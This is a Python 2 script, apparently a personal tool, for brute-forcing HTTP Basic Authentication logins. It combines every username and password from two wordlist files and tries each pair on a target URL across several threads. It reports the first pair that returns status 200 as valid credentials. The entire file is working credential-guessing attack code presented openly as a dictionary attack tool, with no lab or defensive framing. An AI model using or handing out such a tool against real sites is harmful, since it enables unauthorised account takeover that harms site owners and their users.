#!/usr/bin/env python


''' Web authentication dictionary attack tool. '''


import argparse
import os.path
import sys
import urlparse
import itertools
import threading
import Queue

import requests

end_flag = False
print_lock = threading.Lock()

def cmd_line_args():
    '''Setup command line options parser, parse arugments and return options tuple.'''

    parser = argparse.ArgumentParser(description="Dictionary Attack / Brute force HTTP login credentials")
    parser.add_argument("target", type=str, help="Target URL")
    parser.add_argument("-p", "--password", type=str, required=True, 
        dest="passwords_file")
    parser.add_argument("-u", "--username", type=str, required=True, 
        dest="usernames_file", help="File with list of usernames")

    parser.add_argument("-t", "--threads", type=int, default=5, dest="threads", help="Number of worker threads")

    return parser.parse_args()

def prefix_print(msg, error=False):
    '''Print to stdout with a [+] or a [!] depending on error param.'''

    prefix = "[+]" if not error else "[!]"
    print prefix + " " + msg

def abort_on_missing_file(filename):
    '''Check if files exist and exit with message if they do not. '''

    if not os.path.exists(filename):
        prefix_print("File \'%s\' was not found.  Exiting." % (filename), True)
        sys.exit(0)

def try_credentials(target_url, in_queue, out_queue):
    '''
    Make request to target URL using username and password params as credentials.  Inspect response code to determine success.

    msg = "Trying credentials: %s, %s" % (username, password)

    Without the Connection: Close header, the program crashed on an exception from the requests module.

    response = requests.get(target_url, auth=(username, password), headers={'Connection': 'close'})

    if response.status_code == 200:
        msg = msg + "\t\t\tSuccess\t[Status Code: %s]" % (response.status_code)
        prefix_print(msg)
        return (username, password)

    msg = msg + "\t\t\tFailed\t[Status Code: %s]" % (response.status_code)
    prefix_print(msg)
    return
    '''
    global end_flag
    while not end_flag:
        try:
            data = in_queue.get(block=False)
            username = data[0]
            password = data[1]

            msg = "Trying credentials: %s, %s" % (username, password)

            response = requests.get(target_url, auth=(username, password), headers={'Connection': 'close'})

            msg = msg + "\t\t\t[Status Code: %s]" % (response.status_code)

            print_lock.acquire() 
            prefix_print(msg)
            print_lock.release()

            if response.status_code == 200:
                out_queue.put((username, password))
                end_flag = True

        except Queue.Empty:
            end_flag = True

def main():
    args = cmd_line_args()

    abort_on_missing_file(args.passwords_file)
    abort_on_missing_file(args.usernames_file)

    #check url scheme 
    if urlparse.urlparse(args.target).scheme not in ['http', 'https']:
        prefix_print("Incorrect / missing URL scheme on target \'%s\'. "
            "Only HTTP / HTTPS are supported." % (args.target), True)

    credential_queue = Queue.Queue()
    result_queue = Queue.Queue()

    thread_pool = [threading.Thread(target=try_credentials, args=(args.target, credential_queue, result_queue)) for i in range(args.threads)]


    #make a big list of username / pass tuples rather than reading from file and then passing one at a time to threads
    with open(args.usernames_file) as uname_infile, open(args.passwords_file,
        'r') as pwd_infile:

        prefix_print("Loading word list from file...")
        for x in itertools.product(uname_infile, pwd_infile):
            credential_queue.put((x[0].rstrip(), x[1].rstrip())) 
        prefix_print("Loading complete.")

    for thread in thread_pool:
        thread.start()


    for thread in thread_pool:
        thread.join()



    if not result_queue.empty():
        username, password = result_queue.get()
        prefix_print("Valid Credentials: %s, %s" % (username, password))
    else:
        prefix_print("No valid credentials found.")


    '''
        if(try_credentials(args.target, x[0].rstrip(), x[1].rstrip())):
            break

    Alternate method to combine each username in the 
    username file with each password in the password file.

    itertools was ~28 seconds faster on 500 usernames x 500 passwords.

    for uname in uname_infile:
        cur_uname = uname.rstrip()
        for pwd in pwd_infile:
            cur_pwd = pwd.rstrip()
            if(try_credentials(args.target, cur_uname, cur_pwd)):
                break
        pwd_infile.seek(0);

    ''' 

if __name__ == '__main__':
    main()
